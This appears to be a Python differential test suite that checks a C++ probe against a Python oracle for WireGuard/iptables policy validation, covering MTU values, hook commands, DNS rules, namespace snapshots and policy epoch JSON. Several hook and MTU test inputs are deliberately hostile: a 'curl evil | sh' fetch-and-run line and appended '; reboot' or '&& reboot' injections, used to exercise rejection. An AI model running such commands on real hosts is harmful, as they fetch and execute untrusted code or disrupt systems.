"""Differential policy tests using Python as oracle and a C++ JSON fixture probe.
All runner outputs are fixtures. Never invokes Docker or networking commands.
"""
import argparse,copy,importlib.util,json,subprocess,sys,ipaddress
from pathlib import Path
p=argparse.ArgumentParser();p.add_argument('--probe',required=True);a=p.parse_args()
sys.path.insert(0,str(Path(__file__).resolve().parents[1]));import policy as oracle;import test_policy as fixtures
base=fixtures.INTERFACE;fixture=fixtures.PolicyTests();dns=fixtures.DNS;proxy=fixture.proxy_group()
def evaluate(c):
 calls=[]
 def runner(*args):calls.append(list(args));return c['responses']['\t'.join(args[3:])].encode()
 try:
  op=c['op']
  if op=='mtu':r=oracle.mtu(c['value'])
  elif op=='normalize':r=oracle.normalize(c['rule'],c['iface'])
  elif op=='hooks':r=oracle.validate_hooks(c['interface'],c['iface'])
  elif op=='filter':r=oracle.standard_filter(c['iface'],c['network'])
  elif op=='docker':r=list(oracle.docker_dns_rules(c['lines']))
  elif op=='proxy':r=oracle.server_dns_proxy_rules(c['lines'],c['address'])
  elif op=='snapshot':r=oracle.namespace_snapshot(runner,'fixture-container',c['interface'],c['iface'],c.get('owned',[]))
  elif op=='firewall':r=oracle.firewall_script(c)
  elif op=='epoch':
   if not c['exists']:r=None
   elif c.get('raw') is None:raise ValueError('managed_client_policy_not_ready')
   else:r=oracle.parse_client_policy_epoch(c['raw'])
  return {'ok':r,'calls':calls}
 except Exception as e:
  code=str(e)
  if isinstance(e,json.JSONDecodeError):code='policy JSON'
  elif isinstance(e,(ipaddress.AddressValueError,ipaddress.NetmaskValueError)):code='configuration address'
  elif isinstance(e,AttributeError) and c['op']=='epoch':code='managed_client_policy_not_versioned'
  elif isinstance(e,KeyError):code='missing field'
  elif isinstance(e,IndexError):code='missing state'
  elif isinstance(e,ValueError) and ('quotation' in code or 'escaped' in code):code='shell syntax'
  elif isinstance(e,ValueError) and ('address' in code.lower() or 'host bits' in code or 'netmask' in code or 'IPv4 or IPv6 interface' in code):code='configuration address'
  return {'error':code,'calls':calls}
cases=[]
for v in ['575','576','9000','9001','0576','000576','1280','1280; reboot','-1',' 1280','١٢٨٠']:
 cases.append(dict(op='mtu',value=v))
for rule in ['-A INPUT -i %i -j ACCEPT','-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT','-A FORWARD -m conntrack --ctstate NEW,RELATED,ESTABLISHED -j ACCEPT','-A INPUT -i "wg0" -j ACCEPT','--comment "a b"','--comment "a\\$b"',"'unterminated",'abc\\','--state','--ctstate','--state ,A,B,']:
 cases.append(dict(op='normalize',rule=rule,iface='wg0'))
cases.append(dict(op='filter',iface='wg0',network='10.8.1.0/24'))
for hook in ['', 'iptables -A FORWARD -i %i -j ACCEPT','iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE','iptables -A FORWARD -i %i -j ACCEPT; iptables -t nat -A POSTROUTING -s 10.8.1.0/24 -o eth1 -j MASQUERADE','curl evil | sh','iptables -A FORWARD -i %i -j ACCEPT && reboot',"iptables -A FORWARD -i '%i' -j ACCEPT",'iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT']:
 cases.append(dict(op='hooks',interface={**base,'PostUp':hook},iface='wg0'))
cases.append(dict(op='hooks',interface={**base,'PostDown':'iptables -D FORWARD -i %i -j ACCEPT'},iface='wg0'))
for op,group in [('docker',dns),('proxy',proxy)]:
 variants=[[],group,group[:-1],group+[group[-1]],list(reversed(group)),group+['-N UNKNOWN']]
 for old,new in [('--dport 53','--dport 54'),('/32','/24'),('-m tcp','-m udp'),('44919','53'),('44919','65536'),('44919','999999999999999999999999999999'),('172.29.172.254','127.0.0.1'),('172.29.172.254','0.0.0.0'),('172.29.172.254','224.0.0.1'),('10.8.1.1','10.8.1.2')]:variants.append([x.replace(old,new) for x in group])
 for i in range(len(group)):variants.append(group[:i]+group[i+1:])
 for v in variants:cases.append(dict(op=op,lines=v,address=base['Address']))
commands=[('ip','-o','link','show','dev','wg0'),('ip','rule','show')]+[('iptables','-t',t,'-S') for t in ('raw','mangle','filter','nat')]+[('ip','route','show','table','main')]+[('ip','route','get',a) for a in ('1.1.1.1','8.8.8.8','172.29.172.254','172.29.172.253')]
responses={'\t'.join(cmd):fixture.run_fixture('docker','exec','fixture-container',*cmd).decode() for cmd in commands}
def snap(r=responses,**extra):return dict(op='snapshot',interface=base,iface='wg0',responses=r,**extra)
cases.append(snap())
for group in [dns,proxy,dns+proxy,list(reversed(proxy)),dns[:-1],proxy[:-1],['-N UNAPPROVED_CHAIN']]:
 r=copy.deepcopy(responses);r['iptables\t-t\tnat\t-S']+='\n'.join(group)+'\n';cases.append(snap(r))
for key,variants in {
 'ip\t-o\tlink\tshow\tdev\twg0':['no mtu','5: wg0: mtu 1420 state UP','mtu 575','mtu 1280'],
 'ip\trule\tshow':['','0: from all lookup local\n','0: from all lookup local\n0: from all lookup local\n','100: from all lookup main\n'],
 'iptables\t-t\traw\t-S':['-P OUTPUT DROP\n','-N BAD\n',''],
 'iptables\t-t\tmangle\t-S':['-A OUTPUT -j ACCEPT\n'],
 'iptables\t-t\tfilter\t-S':['-P INPUT DROP\n','-A INPUT -j ACCEPT\n','-A INPUT --comment owned --dport 18082 -j ACCEPT\n'],
 'ip\troute\tshow\ttable\tmain':['default via 172.29.172.1 dev eth1\n','default via 172.17.0.1 dev eth2\n','10.8.1.1/24 dev wg0 proto kernel scope link src 10.8.1.1\n','10.8.2.0/24 dev wg0 proto kernel scope link src 10.8.2.1\n','10.8.1.0/24 dev wg0 proto kernel scope link src 999.0.0.1\n'],
 'ip\troute\tget\t1.1.1.1':['1.1.1.1 dev eth2','1.1.1.1 dev eth1'],
}.items():
 for v in variants:r=copy.deepcopy(responses);r[key]=v;cases.append(snap(r,owned=['owned']))
for mtu in ['1420','575','1280']:
 c=snap();c['interface']={**base,'MTU':mtu};cases.append(c)
for filter,nat in [([],[]),(['-A INPUT -j ACCEPT'],['-A POSTROUTING -j MASQUERADE','-N CHAIN']),(['-N A','-A INPUT -j A','-N B'],proxy)]:cases.append(dict(op='firewall',filter=filter,nat=nat))
sha='sha256:'+'a'*64
for exists,raw in [(False,None),(True,None),(True,'{}'),(True,'bad'),(True,json.dumps({'policy':{'revision':1,'contentSha256':sha}})),(True,json.dumps({'policy':{'revision':-2,'contentSha256':sha}}))]+[(True,json.dumps({'policy':{'revision':v,'contentSha256':sha}})) for v in [True,False,1.2,'1',None]]+[(True,json.dumps({'policy':{'revision':1,'contentSha256':v}})) for v in ['',sha.upper(),'sha256:'+'a'*63]]:cases.append(dict(op='epoch',exists=exists,raw=raw))
cases.append(dict(op='epoch',exists=True,raw=json.dumps({'policy':{'revision':1,'contentSha256':sha+'\x00trailing'}})))
# Lossless names/EOF and address boundaries: malformed NUL inputs must not alias.
valid_epoch=json.dumps({'policy':{'revision':1,'contentSha256':sha}})
for suffix in [' ', '\n\t', '\0', '\0garbage', '\0{}', '{}', 'garbage']:
 cases.append(dict(op='epoch',exists=True,raw=valid_epoch+suffix))
for name in ['policy\0suffix','revision\0suffix','contentSha256\0suffix']:
 value={'policy':{'revision':1,'contentSha256':sha}}
 if name.startswith('policy'):value[name]=value.pop('policy')
 else:value['policy'][name]=value['policy'].pop(name.split('\0')[0])
 cases.append(dict(op='epoch',exists=True,raw=json.dumps(value)))
for extras in [{'unknown':'\0'}, {'unknown':r'\u0000'}, {'unknown\0key':'opaque'}, {'unknown':float('nan')}, {'unknown':float('inf')}]:
 cases.append(dict(op='epoch',exists=True,raw=json.dumps({'policy':{'revision':1,'contentSha256':sha},**extras})))
for alias in ['policy\0suffix','revision\0suffix','contentSha256\0suffix']:
 for first in [False,True]:
  value={'policy':{'revision':1,'contentSha256':sha}}
  target=value if alias.startswith('policy') else value['policy']
  if first:
   original=dict(target);target.clear();target[alias]=False;target.update(original)
  else:target[alias]=False
  cases.append(dict(op='epoch',exists=True,raw=json.dumps(value)))
for raw in ['{"policy":{"revision":2,"revision":1,"contentSha256":"'+sha+'"}}',
            '{"policy":false,"policy":{"revision":1,"contentSha256":"'+sha+'"}}',
            '{"policy":{"revision":1,"contentSha256":"'+sha+'"},"policy":false}']:
 cases.append(dict(op='epoch',exists=True,raw=raw))
for address in ['10.8.1.1\0suffix/24','10.8.1.1/255.255.255.0\0suffix']:
 cases.append(dict(op='proxy',lines=proxy,address=address))
cases.append(dict(op='hooks',interface={'Address':'fe80::1%zone\0scope/128'},iface='wg0'))
for n,c in enumerate(cases):
 expected=evaluate(c);r=subprocess.run([a.probe],input=json.dumps(c).encode(),capture_output=True);assert r.returncode==0,(n,r.stderr)
 actual=json.loads(r.stdout)
 assert expected==actual,f'case {n} ({c["op"]}): expected {expected!r}, actual {actual!r}'
# Explicit native range boundary: Python accepts arbitrary-size integers, while
# the typed staged API intentionally rejects epochs outside signed int64.
for revision in [2**63,2**64,10**100,-2**63-1,-10**100]:
 c=dict(op='epoch',exists=True,raw=json.dumps({'policy':{'revision':revision,'contentSha256':sha}}))
 actual=json.loads(subprocess.check_output([a.probe],input=json.dumps(c).encode()))
 assert actual.get('error') in ('policy revision range','policy JSON'),actual
print(f'policy Python/native parity: {len(cases)} cases passed including FakeRunner command order; 5 native range-negative cases passed')

